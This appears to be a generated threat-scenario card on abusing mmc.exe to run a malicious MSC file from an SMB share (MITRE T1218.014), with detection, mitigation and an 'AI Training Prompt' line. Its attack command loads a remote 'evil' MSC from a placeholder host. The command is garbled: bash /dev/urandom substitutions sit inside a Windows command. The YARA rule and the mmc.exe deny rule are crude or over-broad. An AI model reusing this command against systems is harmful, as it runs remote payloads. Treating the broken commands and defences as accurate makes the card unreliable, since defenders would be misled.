---
type: campaign
scenario_id: 240
tactic: Defense Evasion
technique: "T1218.014: MMC"
technique_id: T1218.014
tags: [campaign, lotl, defense_evasion]
---

# Using mmc.exe to execute malicious MSC via SMB share.

## Threat Description
Using mmc.exe to execute malicious MSC via SMB share.

## Attack Command
```
mmc \\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor mmc SMB: `wmic process where name='mmc.exe' get commandline | findstr \\`; YARA rule: `rule MmcSmbMsc { strings: $a = /mmc.*\\/ nocase; condition: $a }`.

## Mitigation
Restrict mmc: `icacls %windir%\System32\mmc.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.

## AI Training Prompt
Train AI to detect mmc SMB MSC execution and suggest SMB restrictions.

## References
- MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
